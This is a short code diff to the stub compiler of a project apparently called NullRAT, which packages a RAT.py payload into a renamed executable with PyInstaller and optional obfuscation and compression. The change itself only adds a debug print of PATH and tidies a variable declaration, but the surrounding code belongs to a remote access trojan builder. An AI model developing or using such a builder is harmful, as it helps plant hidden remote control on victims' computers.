@@ -13,6 +13,8 @@ proc compiler*(): int =
     setCurrentDir(appDirectory / "NullRAT")
     
     stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
+    echo getEnv("PATH") # DEBUG
+
     echo ""
     var obfuscate: bool
     var compress: bool
@@ -138,9 +140,10 @@ proc compiler*(): int =
                 dat = fmt" --add-data ""{m};."""
                 pyinst_cmd.add(dat)
 
-        randomString = $rand(1337)
-        obPyName = randomString & ".py"
-        obFileName = randomString & ".exe"
+        let 
+            randomString = $rand(1337)
+            obPyName = randomString & ".py"
+            obFileName = randomString & ".exe"
 
         moveFile(currentDirectory / "RAT.py", currentDirectory / obPyName)
             
